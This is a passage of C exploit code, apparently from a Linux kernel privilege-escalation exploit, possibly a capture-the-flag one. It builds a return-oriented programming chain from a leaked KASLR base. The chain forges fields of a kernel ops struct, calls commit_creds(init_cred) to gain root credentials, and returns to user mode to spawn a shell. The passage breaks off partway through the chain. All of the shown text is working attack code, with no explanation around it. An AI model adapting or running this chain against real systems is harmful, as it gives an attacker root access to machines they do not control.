void nperm(){
    sandbox();
    saveStatus();
    size_t ctx[0x200]        = {};
    size_t ct                = 0 ; 
    ctx[ct++] = STR_IPVLEN;
    ct = 10;
    ctx[ct++] = NPERM_SPACE - NO_ASLR_BASE + leaked_kaslr;
    ctx[ct++] = 0; // We imitate the value on a valid ops struct
    ctx[ct++] = 1; // We imitate the value on a valid ops struct
    ctx[ct++] = 2; // We imitate the value on a valid ops struct
    ctx[ct++] = 0; // We imitate the value on a valid ops struct
    ctx[ct++] = 0; // We imitate the value on a valid ops struct
    ctx[ct++] = 0; // We imitate the value on a valid ops struct
    ctx[ct++] = POP_RDI_RET      - NO_ASLR_BASE + leaked_kaslr;
    ctx[ct++] = INIT_CRED        - NO_ASLR_BASE + leaked_kaslr;
    ctx[ct++] = COMMIT_CREDS     - NO_ASLR_BASE + leaked_kaslr;
    ctx[ct++] = POP_R11_POP_RCX  - NO_ASLR_BASE + leaked_kaslr;
    ctx[ct++] = user_rflags;
    ctx[ct++] = (size_t) getShell;
    ctx[ct++] = POP_RDI_RET      - NO_ASLR_BASE + leaked_kaslr;
